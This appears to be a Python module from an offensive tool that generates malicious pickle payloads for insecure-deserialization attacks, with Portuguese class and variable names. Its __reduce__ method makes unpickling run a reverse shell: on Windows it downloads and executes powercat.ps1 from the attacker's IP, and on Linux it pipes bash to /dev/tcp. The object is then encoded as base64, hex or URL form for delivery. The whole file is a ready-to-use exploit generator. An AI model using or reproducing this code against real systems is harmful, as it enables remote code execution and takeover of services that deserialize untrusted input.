import pickle
import os
from .encoded import Encode
from termcolor import colored

class Desserialize(object):

    def __init__(self,ip:str,porta:str,sistema:str):
        self.__ip = ip
        self.__porta = porta
        self.__sistema = sistema

    def __reduce__(self) -> tuple:
        match self.__sistema:
            case "Windows":
                text = colored('Link powercat: https://github.com/besimorhino/powercat/blob/master/powercat.ps1', 'red')
                print(text)
                return (os.system,(f"powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{self.__ip}/powercat.ps1');powercat -c {self.__ip} -p {self.__porta} -e cmd\"",))
            case "Linux":
                return (os.system,(f"/bin/bash -i >& /dev/tcp/{self.__ip}/{self.__porta} 0>&1",))    
                
class ObjetoMalicioso():

    def __init__(self,ip:str,porta:str,encode:str,sistema:str):
        self.__ip = ip
        self.__porta = porta
        self.__encode = encode
        self.__sistema = sistema

    def Objeto_Serializado(self):
        Object = pickle.dumps(Desserialize(self.__ip,self.__porta,self.__sistema))
        match self.__encode:
            case "b64":
                Encode.base64(Object)
            case "shell":
                Encode.shell(Object)
            case "urlencode":
                Encode.urlencode(Object)
            case "hex":
                Encode.hexadecimal(Object)
